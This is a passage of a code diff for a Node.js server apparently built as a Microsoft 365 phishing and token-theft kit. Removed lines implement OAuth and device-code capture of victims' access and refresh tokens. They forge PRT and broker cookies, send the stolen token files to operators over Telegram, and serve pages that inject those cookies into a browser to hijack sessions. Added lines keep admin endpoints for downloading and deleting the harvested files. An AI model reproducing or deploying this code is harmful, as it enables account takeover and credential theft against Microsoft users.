+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Content-Disposition', `attachment; filename="cookies_${sanitizeFilenamePart(email)}.json"`);
+    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
+    return res.send(plain);
+  } else {
+    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
+    return res.download(p, `cookies_${sanitizeFilenamePart(email)}.json`);
+  }
+});
+
+// Download tokens (admin only)
+app.get('/api/download/tokens/:email', requireLogin, requireAdmin, (req, res) => {
+  const email = req.params.email;
+  const p = tokenFilePath(email);
+
+  if (!fs.existsSync(p)) return res.status(404).json({ error: 'token file not found' });
+
   try {
-    const { code, state, error, error_description } = req.query;
+    const audit = { admin: req.session.user.username, action: 'download_tokens', email, ip: req.ip };
+    logAudit(audit);
+  } catch (e) {}
 
-    if (error) {
-      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent(error_description || error)}`);
-    }
-
-    if (!code || !state) {
-      return res.redirect(`${OAUTH_DONE_LANDING}?error=Missing%20code%20or%20state`);
-    }
-
-    const stateData = getOAuthState(state);
-    if (!stateData) {
-      return res.redirect(`${OAUTH_DONE_LANDING}?error=Invalid%20state`);
-    }
-    removeOAuthState(state);
-
-    const tokenUrl = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`;
-    const tokenBody = new URLSearchParams({
-      client_id: CLIENT_ID,
-      client_secret: CLIENT_SECRET || '',
-      code,
-      redirect_uri: stateData.redirect_uri,
-      grant_type: 'authorization_code'
-    });
-
-    const tokenResp = await fetch(tokenUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: tokenBody
-    });
-
-    let tokenData = null;
-    const tokenText = await tokenResp.text().catch(()=>null);
-    try { tokenData = tokenText ? JSON.parse(tokenText) : null; } catch(err) {
-      console.error('Token exchange parse failed, raw:', tokenText);
-      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent('Token exchange returned non-JSON')}`);
-    }
-
-    if (!tokenResp.ok) {
-      console.error('Token exchange error:', tokenData || tokenText);
-      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent(tokenData?.error_description || tokenData?.error || 'Token exchange failed')}`);
-    }
-
-    if (!tokenData || !tokenData.access_token) {
-      console.error('Token exchange missing access_token:', tokenData || tokenText);
-      return res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent('Token exchange missing access_token')}`);
-    }
-
-    const info = extractFromIdToken(tokenData.id_token || tokenData.access_token);
-    const email = info?.email || 'unknown@microsoft.com';
-    const userId = info?.id || 'unknown';
-
-    const prtData = generatePrimaryRefreshToken(tokenData, email);
-    const brokerTokenData = generateAADBrokerToken(tokenData, email, userId);
-
-    const tokenPath = tokenFilePath(email);
-    writeJsonMaybeEncrypted(tokenPath, {
-      email,
-      user_id: userId,
-      timestamp: new Date().toISOString(),
-      tokens: {
-        access_token: tokenData.access_token,
-        id_token: tokenData.id_token,
-        refresh_token: tokenData.refresh_token,
-        expires_in: tokenData.expires_in,
-        token_type: tokenData.token_type,
-        scope: tokenData.scope
-      },
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      created_by: 'oauth'
-    });
-
-    const cookiePath = cookieFilePath(email);
-    writeJsonMaybeEncrypted(cookiePath, {
-      email,
-      user_id: userId,
-      timestamp: new Date().toISOString(),
-      prt: prtData,
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      created_by: 'oauth'
-    });
-
-    const downloadTokensUrl = `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`;
-    const downloadCookiesUrl = `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`;
-
-    const vaultEntry = {
-      email,
-      user_id: userId,
-      device_id: brokerTokenData.device_id,
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      tokens_file: path.basename(tokenPath),
-      cookies_file: path.basename(cookiePath),
-      tokens_download_url: downloadTokensUrl,
-      cookies_download_url: downloadCookiesUrl,
-      created_at: new Date().toISOString(),
-      created_by: 'oauth',
-      expires_at: brokerTokenData.expires_at
-    };
-
-    try {
-      saveToVault(email, {
-        email,
-        user_id: userId,
-        broker_token: brokerTokenData.broker_token,
-        broker_payload: brokerTokenData.broker_payload,
-        device_id: brokerTokenData.device_id,
-        created_at: new Date().toISOString(),
-        status: 'active',
-        expires_at: brokerTokenData.expires_at
-      });
-    } catch (e) {
-      console.warn('Failed to save to admin vault:', e && e.message);
-    }
-
-    try {
-      saveUserVaultEntry(email, vaultEntry);
-      let matchedUser = null;
-      if (fs.existsSync(usersFilePath())) {
-        const usersList = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
-        matchedUser = usersList.find(u => (u.email && u.email.toLowerCase() === email.toLowerCase()) || (u.username && u.username.toLowerCase() === email.toLowerCase()));
-        if (!matchedUser && email && email.includes('@')) {
-          const localPart = email.split('@')[0].toLowerCase();
-          matchedUser = usersList.find(u => u.username && u.username.toLowerCase() === localPart);
-        }
-        if (matchedUser) {
-          const ownerIdentifier = matchedUser.email || matchedUser.username;
-          if (ownerIdentifier !== email) saveUserVaultEntry(ownerIdentifier, vaultEntry);
-        }
-      }
-    } catch (e) {
-      console.warn('Failed to save user vault:', e && e.message);
-    }
-
-    // ===== TELEGRAM NOTIFICATIONS & FILE SEND =====
-    try {
-      const admins = getAdminUsers();
-      const adminChatIds = new Set();
-      if (admins && admins.length) {
-        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
-      }
-      const globalSettings = readSettingsSafe();
-      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);
-
-      for (const chatId of adminChatIds) {
-        await notifyTelegram('🔔 New OAuth Token Received', `Email: ${email}\nDevice: ${brokerTokenData.device_id}`, email, chatId);
-        // Send token file to admin
-        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 OAuth Tokens for ${email}`, chatId);
-        // Send cookie/PRT file to admin
-        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, chatId);
-      }
-    } catch (e) {
-      console.warn('Admin notify/send failed:', e && e.message);
-    }
-
-    try {
-      const matchedUser = findMatchingUserForEmail(email);
-      let userChatId = (matchedUser && matchedUser.telegram_chat_id) || getChatIdForUser(email);
-      let userBotToken = (matchedUser && matchedUser.telegram_bot_token) || getBotTokenForUser(email);
-      if (userChatId) {
-        await notifyTelegram('🔐 Your OAuth tokens are ready', `User: ${email}\nDevice: ${brokerTokenData.device_id}`, email, userChatId, userBotToken);
-        // Send token file to user
-        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, userChatId, userBotToken);
-        // Send cookie/PRT file to user
-        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, userChatId, userBotToken);
-      }
-    } catch (e) {
-      console.warn('User notify/send failed:', e && e.message);
-    }
-
-    logAudit({ action: 'oauth_complete', email, device_id: brokerTokenData.device_id, ip: req.ip });
-
-    res.redirect(`${OAUTH_DONE_LANDING}?success=true&email=${encodeURIComponent(email)}`);
-  } catch (err) {
-    console.error('OAuth callback error:', err);
-    res.redirect(`${OAUTH_DONE_LANDING}?error=${encodeURIComponent(err.message)}`);
+  const raw = fs.readFileSync(p, 'utf8');
+  if (raw.startsWith('ENCRYPTED\n')) {
+    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
+    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
+    return res.setHeader('Content-Type', 'application/json') || res.send(plain);
+  } else {
+    return res.download(p, `tokens_${sanitizeFilenamePart(email)}.json`);
   }
 });
 
-// ===== AUTO-INJECT ENDPOINT (for seamless redirect after device auth) =====
-app.get('/api/auth/inject', async (req, res) => {
-  try {
-    const email = req.query.email;
-    const landing = req.query.landing || '/';
-    if (!email) return res.status(400).send('Email required');
+// Delete files (admin)
+app.delete('/api/files/:email', requireLogin, requireAdmin, (req, res) => {
+  const email = req.params.email;
+  const cookieP = cookieFilePath(email);
+  const tokenP = tokenFilePath(email);
+  const userVaultP = userTokensFilePath(email);
+  const removed = [];
 
-    const cookiePath = cookieFilePath(email);
-    if (!fs.existsSync(cookiePath)) return res.status(404).send('Cookies not found for this email. Please try again.');
+  if (fs.existsSync(cookieP)) { fs.unlinkSync(cookieP); removed.push(path.basename(cookieP)); }
+  if (fs.existsSync(tokenP)) { fs.unlinkSync(tokenP); removed.push(path.basename(tokenP)); }
+  if (fs.existsSync(userVaultP)) { fs.unlinkSync(userVaultP); removed.push(path.basename(userVaultP)); }
 
-    const cookieData = readJsonMaybeEncrypted(cookiePath);
-    if (!cookieData?.broker_token) return res.status(404).send('Broker token not found.');
-
-    // Build the auto-injection script for login.microsoftonline.com
-    const broker = cookieData?.broker_token || '';
-    let prtValue = '';
-    if (cookieData?.prt) {
-      if (typeof cookieData.prt === 'string') prtValue = cookieData.prt;
-      else if (cookieData.prt.prt_token) prtValue = cookieData.prt.prt_token;
-      else if (cookieData.prt._prt) prtValue = cookieData.prt._prt;
-      else {
-        try { prtValue = JSON.stringify(cookieData.prt); } catch(e) { prtValue = ''; }
-      }
-    }
-
-    const prtAssignments = [];
-    if (cookieData?.prt && typeof cookieData.prt === 'object') {
-      for (const [k, v] of Object.entries(cookieData.prt)) {
-        const safeName = String(k).replace(/[\\\"]/g, '\\$&');
-        const val = typeof v === 'string' ? v : JSON.stringify(v);
-        const safeVal = String(val).replace(/[\\\"]/g, '\\$&');
-        prtAssignments.push(`document.cookie = "${safeName}=" + encodeURIComponent("${safeVal}") + "; path=/; max-age=31536000; Secure; SameSite=None";`);
-      }
-    } else if (prtValue) {
-      const safePrt = String(prtValue).replace(/[\\\"]/g, '\\$&');
-      prtAssignments.push(`document.cookie = "x-ms-PRT=" + encodeURIComponent("${safePrt}") + "; path=/; max-age=31536000; Secure; SameSite=None";`);
-    }
-
-    const safeBroker = String(broker).replace(/[\\\"]/g, '\\$&');
-
-    // HTML page that injects and redirects for 1-year expiry
-    const html = `<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Authenticating...</title>
-  <script>
-    (function() {
-      try {
-        // Inject broker token with 1-year max-age (31536000 seconds)
-        document.cookie = "x-ms-RefreshTokenCredential=" + encodeURIComponent("${safeBroker}") + "; path=/; max-age=31536000; Secure; SameSite=None";
-        // Inject PRT pieces with 1-year max-age
-        ${prtAssignments.join('\n        ')}
-        console.log('✅ Broker token & PRT injected successfully (1-year expiry).');
-      } catch (e) {
-        console.error('Injection failed:', e);
-      }
-      // Redirect to landing page after a short delay
-      setTimeout(function() {
-        window.location.href = "${landing}";
-      }, 500);
-    })();
-  </script>
-</head>
-<body>
-  <p>Authenticating... Please wait.</p>
-</body>
-</html>`;
-
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.send(html);
-  } catch (err) {
-    console.error('Auto-inject error:', err);
-    res.status(500).send('Authentication redirect failed. Please try again.');
-  }
-});
-
-// ===== AUTO-LOGIN (cookie setting) =====
-function computeCookieOptions(req) {
-  const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https' || APP_BASE_URL.startsWith('https://');
-  const oneYearMs = 365 * 24 * 60 * 60 * 1000;
-  const sameSite = isSecure ? 'None' : 'Lax';
-  const opts = {
-    httpOnly: false,
-    secure: isSecure,
-    sameSite,
-    path: '/',
-    maxAge: oneYearMs
-  };
-  if (process.env.COOKIE_DOMAIN) {
-    opts.domain = process.env.COOKIE_DOMAIN;
-  }
-  return opts;
-}
-
-app.get('/__set_cookies', async (req, res) => {
-  try {
-    const email = req.query.email;
-    if (!email) return res.status(400).send('Email required');
-
-    const cookiePath = cookieFilePath(email);
-    const tokenPath = tokenFilePath(email);
-
-    if (!fs.existsSync(cookiePath)) return res.status(404).send('Cookies not found');
-
-    const cookieData = readJsonMaybeEncrypted(cookiePath);
-    if (!cookieData?.prt && !cookieData?.broker_token) return res.status(400).send('PRT or Broker Token data not found');
-
-    const cookieOptions = computeCookieOptions(req);
-
-    // Set PRT cookies (client-readable) with 1-year expiry
-    if (cookieData.prt && typeof cookieData.prt === 'object') {
-      for (const [k, v] of Object.entries(cookieData.prt)) {
-        try {
-          const safeVal = typeof v === 'string' ? v : JSON.stringify(v);
-          res.cookie(k, encodeURIComponent(safeVal), cookieOptions);
-        } catch (e) {
-          console.warn('Failed to set cookie', k, e && e.message);
-        }
-      }
-    }
-
-    // Set broker token cookie (httpOnly) with 1-year expiry
-    if (cookieData.broker_token) {
-      const brokerOpts = { ...cookieOptions, httpOnly: true };
-      res.cookie('aad_broker_token', encodeURIComponent(cookieData.broker_token), brokerOpts);
-    }
-
-    logAudit({ action: 'set_prt_cookies', email, host: req.headers.host, ip: req.ip });
-
-    (async function sendFilesAfterSettingCookies() {
-      try {
-        const admins = getAdminUsers();
-        const adminChatIds = new Set();
-        if (admins && admins.length) { admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); }); }
-        const globalSettings = readSettingsSafe();
-        if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);
-
-        for (const chatId of adminChatIds) {
-          try {
-            const adminUser = admins.find(a => a.telegram_chat_id === chatId);
-            const botToken = (adminUser && adminUser.telegram_bot_token) || getBotTokenFromSettingsOrEnv();
-            await notifyTelegram('🔔 Cookies set via auto-login', `Cookies set for ${email} by auto-login endpoint`, email, chatId, botToken);
-            if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, chatId, botToken);
-            if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, chatId, botToken);
-          } catch (e) { console.warn('Failed to send files to admin chat', e && e.message); }
-        }
-
-        const matchedUser = findMatchingUserForEmail(email);
-        const userChatId = (matchedUser && matchedUser.telegram_chat_id) || getChatIdForUser(email);
-        const userBotToken = (matchedUser && matchedUser.telegram_bot_token) || getBotTokenForUser(email);
-        if (userChatId) {
-          try {
-            await notifyTelegram('🔐 Your cookies were set', `Cookies set for ${email} via auto-login`, email, userChatId, userBotToken);
-            if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, userChatId, userBotToken);
-            if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, userChatId, userBotToken);
-          } catch (e) { console.warn('Failed to send files to user chat', e && e.message); }
-        }
-      } catch (e) { console.warn('sendFilesAfterSettingCookies error', e && e.message); }
-    })();
-
-    return res.redirect('/');
-  } catch (err) {
-    console.error('Set cookies error:', err);
-    res.status(500).send('Error setting cookies: ' + (err && err.message));
-  }
-});
-
-// ===== DEVICE CODE FLOW =====
-app.post('/api/device/code', async (req, res) => {
-  try {
-    if (!CLIENT_ID) return res.status(400).json({ error: 'CLIENT_ID not configured' });
-
-    const deviceCodeUrl = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`;
-    const deviceCodeBody = new URLSearchParams({
-      client_id: CLIENT_ID,
-      scope: SCOPE
-    });
-
-    const deviceResp = await fetch(deviceCodeUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: deviceCodeBody
-    });
-
-    const deviceData = await deviceResp.json();
-
-    if (!deviceResp.ok) {
-      console.error('Device code request error:', deviceData);
-      return res.status(400).json({ error: deviceData.error_description || 'Failed to get device code' });
-    }
-
-    res.json({
-      success: true,
-      device_code: deviceData.device_code,
-      user_code: deviceData.user_code,
-      verification_uri: deviceData.verification_uri,
-      verification_uri_complete: deviceData.verification_uri_complete,
-      expires_in: deviceData.expires_in,
-      interval: deviceData.interval
-    });
-  } catch (err) {
-    console.error('Device code error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-app.post('/api/device/token', async (req, res) => {
-  try {
-    const { device_code } = req.body || {};
-    if (!device_code) return res.status(400).json({ error: 'device_code required' });
-
-    const tokenUrl = `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`;
-    const tokenBody = new URLSearchParams({
-      client_id: CLIENT_ID,
-      client_secret: CLIENT_SECRET || '',
-      device_code: device_code,
-      grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
-    });
-
-    const tokenResp = await fetch(tokenUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: tokenBody
-    });
-
-    let tokenData = null;
-    const tokenText = await tokenResp.text().catch(()=>null);
-    try { tokenData = tokenText ? JSON.parse(tokenText) : null; } catch (err) {
-      console.error('Device token parse failed, raw:', tokenText);
-      return res.status(500).json({ error: 'token_response_not_json', raw: tokenText });
-    }
-
-    if (!tokenResp.ok) {
-      if (tokenData && tokenData.error) {
-        if (tokenData.error === 'authorization_pending') {
-          return res.status(400).json({ error: 'authorization_pending' });
-        }
-        return res.status(400).json({ error: tokenData.error_description || tokenData.error });
-      }
-      return res.status(400).json({ error: tokenText || `HTTP ${tokenResp.status}` });
-    }
-
-    if (!tokenData || !tokenData.access_token) {
-      console.error('Token response missing access_token:', tokenData || tokenText);
-      return res.status(500).json({ error: 'access_token_missing', raw: tokenData || tokenText });
-    }
-
-    const info = extractFromIdToken(tokenData.id_token || tokenData.access_token);
-    const email = info?.email || 'unknown@microsoft.com';
-    const userId = info?.id || 'unknown';
-
-    const prtData = generatePrimaryRefreshToken(tokenData, email);
-    const brokerTokenData = generateAADBrokerToken(tokenData, email, userId);
-
-    const tokenPath = tokenFilePath(email);
-    writeJsonMaybeEncrypted(tokenPath, {
-      email,
-      user_id: userId,
-      timestamp: new Date().toISOString(),
-      tokens: {
-        access_token: tokenData.access_token,
-        id_token: tokenData.id_token,
-        refresh_token: tokenData.refresh_token,
-        expires_in: tokenData.expires_in,
-        token_type: tokenData.token_type,
-        scope: tokenData.scope
-      },
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      created_by: 'device_code'
-    });
-
-    const cookiePath = cookieFilePath(email);
-    writeJsonMaybeEncrypted(cookiePath, {
-      email,
-      user_id: userId,
-      timestamp: new Date().toISOString(),
-      prt: prtData,
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      created_by: 'device_code'
-    });
-
-    const downloadTokensUrl = `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`;
-    const downloadCookiesUrl = `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`;
-
-    const vaultEntry = {
-      email,
-      user_id: userId,
-      device_id: brokerTokenData.device_id,
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      tokens_file: path.basename(tokenPath),
-      cookies_file: path.basename(cookiePath),
-      tokens_download_url: downloadTokensUrl,
-      cookies_download_url: downloadCookiesUrl,
-      created_at: new Date().toISOString(),
-      created_by: 'device_code',
-      expires_at: brokerTokenData.expires_at
-    };
-
-    try {
-      saveToVault(email, {
-        email,
-        user_id: userId,
-        broker_token: brokerTokenData.broker_token,
-        broker_payload: brokerTokenData.broker_payload,
-        device_id: brokerTokenData.device_id,
-        created_at: new Date().toISOString(),
-        status: 'active',
-        expires_at: brokerTokenData.expires_at
-      });
-    } catch (e) {
-      console.warn('Failed to save to admin vault:', e && e.message);
-    }
-
-    try {
-      saveUserVaultEntry(email, vaultEntry);
-      const matchedUser = findMatchingUserForEmail(email);
-      if (matchedUser) {
-        const ownerId = matchedUser.email || matchedUser.username;
-        if (ownerId && ownerId !== email) saveUserVaultEntry(ownerId, vaultEntry);
-      }
-      logAudit({ action: 'device_token_saved', email, device_id: brokerTokenData.device_id, ip: req.ip });
-    } catch (e) {
-      console.warn('Failed to save user vault:', e && e.message);
-    }
-
-    await notifyTelegram('📱 Device Code Auth Success', `User: ${email}\nDevice: ${brokerTokenData.device_id}`, email);
-
-    try {
-      const admins = getAdminUsers();
-      const adminChatIds = new Set();
-      if (admins && admins.length) {
-        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
-      }
-      const globalSettings = readSettingsSafe();
-      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);
-
-      for (const chatId of adminChatIds) {
-        await notifyTelegram('🔔 New tokens/cookies saved', `Email: ${email}\nDevice: ${brokerTokenData.device_id}`, email, chatId);
-        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, chatId);
-        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, chatId);
-      }
-    } catch (err) {
-      console.error('Failed to send token/cookie file to admin:', err && err.message);
-    }
-
-    try {
-      const matchedUser = findMatchingUserForEmail(email);
-      const userChatId = (matchedUser && matchedUser.telegram_chat_id) || getChatIdForUser(email);
-      const userBotToken = (matchedUser && matchedUser.telegram_bot_token) || getBotTokenForUser(email);
-      if (userChatId) {
-        await notifyTelegram('🔐 Your tokens are ready', `User: ${email}\nDevice: ${brokerTokenData.device_id}`, email, userChatId, userBotToken);
-        if (fs.existsSync(tokenPath)) await sendFileToTelegram(tokenPath, `🔑 Tokens for ${email}`, userChatId, userBotToken);
-        if (fs.existsSync(cookiePath)) await sendFileToTelegram(cookiePath, `🍪 PRT & Broker for ${email}`, userChatId, userBotToken);
-      }
-    } catch (err) {
-      console.error('Failed to send token/cookie file to user:', err && err.message);
-    }
-
-    res.json({
-      success: true,
-      email,
-      user_id: userId,
-      broker_token: brokerTokenData.broker_token,
-      device_id: brokerTokenData.device_id
-    });
-  } catch (err) {
-    console.error('Device token error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ===== BROKER ENDPOINTS =====
-app.post('/api/broker/verify', async (req, res) => {
-  try {
-    const { broker_token } = req.body || {};
-    if (!broker_token) return res.status(400).json({ error: 'broker_token required' });
-
-    try {
-      const decoded = jwt.verify(broker_token, BROKER_TOKEN_SECRET, { algorithms: ['HS256'] });
-
-      res.json({
-        success: true,
-        valid: true,
-        payload: decoded,
-        message: 'Broker token is valid'
-      });
-    } catch (err) {
-      if (err.name === 'TokenExpiredError') {
-        return res.status(401).json({ error: 'token_expired', message: 'Broker token has expired' });
-      }
-      return res.status(401).json({ error: 'invalid_token', message: 'Broker token is invalid' });
-    }
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-app.get('/api/broker/token/:email', requireLogin, async (req, res) => {
-  try {
-    const email = req.params.email;
-
-    if (!(req.session.user && (req.session.user.role === 'admin' || req.session.user.username === email))) {
-      return res.status(403).json({ error: 'forbidden' });
-    }
-
-    const p = cookieFilePath(email);
-    if (!fs.existsSync(p)) return res.status(404).json({ error: 'cookie file not found' });
-
-    const cookieData = readJsonMaybeEncrypted(p);
-    if (!cookieData?.broker_token) return res.status(404).json({ error: 'broker token not found' });
-
-    res.json({ success: true, email, broker_token: cookieData.broker_token, broker_payload: cookieData.broker_payload, created_at: cookieData.timestamp });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-// ===== DEBUG API =====
-app.get('/api/debug/cookies/:email', requireLogin, (req, res) => {
-  try {
-    const email = req.params.email;
-    const sessionUser = req.session.user;
-    const isAdmin = sessionUser && sessionUser.role === 'admin';
-    const isOwner = sessionUser && (sessionUser.username === email || sessionUser.email === email);
-    if (!isAdmin && !isOwner) return res.status(403).json({ error: 'forbidden' });
-
-    const cookieP = cookieFilePath(email);
-    const tokenP = tokenFilePath(email);
-
-    const cookieData = fs.existsSync(cookieP) ? readJsonMaybeEncrypted(cookieP) : null;
-    const tokenData = fs.existsSync(tokenP) ? readJsonMaybeEncrypted(tokenP) : null;
-
-    res.json({ success: true, email, cookieFileExists: fs.existsSync(cookieP), tokenFileExists: fs.existsSync(tokenP), cookieFile: cookieData || null, tokenFile: tokenData || null });
-  } catch (e) {
-    console.error('Debug cookies error:', e);
-    res.status(500).json({ error: e.message || 'debug failed' });
-  }
-});
-
-app.get('/debug', requireLogin, (req, res) => {
-  const html = `<!doctype html>
-<html><head><meta charset="utf-8"><title>Auth Broker Debug</title><style>body{font-family:Arial,sans-serif;padding:18px;background:#f5f7fb}pre{background:#fff;padding:12px;border-radius:6px;border:1px solid #e6e6e6;white-space:pre-wrap}</style></head><body>
-<h2>Auth Broker Debug</h2>
-<p>Current session user: <strong>${req.session.user?.username || 'unknown'}</strong></p>
-<div style="margin-bottom:12px">
-<label>Email to debug: <input id="dbgEmail" type="text" value="${req.session.user?.email || req.session.user?.username || ''}" style="width:320px;padding:6px;margin-left:6px"></label>
-</div>
-<div style="display:flex;gap:8px">
-<button id="btnPreview">Fetch server preview</button>
-</div>
-<pre id="srvPreview">idle</pre>
-<script>
-document.getElementById('btnPreview').addEventListener('click', async () => {
-  const email = document.getElementById('dbgEmail').value;
-  const r = await fetch('/api/debug/cookies/' + encodeURIComponent(email));
-  const j = await r.json();
-  document.getElementById('srvPreview').textContent = JSON.stringify(j, null, 2);
-});
-</script>
-</body></html>`;
-  res.send(html);
+  logAudit({ action: 'delete_files', admin: req.session.user.username, email, removed, ip: req.ip });
+  res.json({ removed });
 });
 
 // Start server
@@ -2287,4 +1423,7 @@ app.listen(PORT, () => {
   console.log(`Auth Broker server listening on ${PORT}`);
   console.log(`APP_BASE_URL=${APP_BASE_URL}`);
   console.log(`✓ Tokens expire in: ${BROKER_TOKEN_EXPIRY} (1 year default)`);
+  if (CLOUDFLARE_TURNSTILE_SECRET) {
+    console.log(`✓ Cloudflare Turnstile enabled`);
+  }
 });
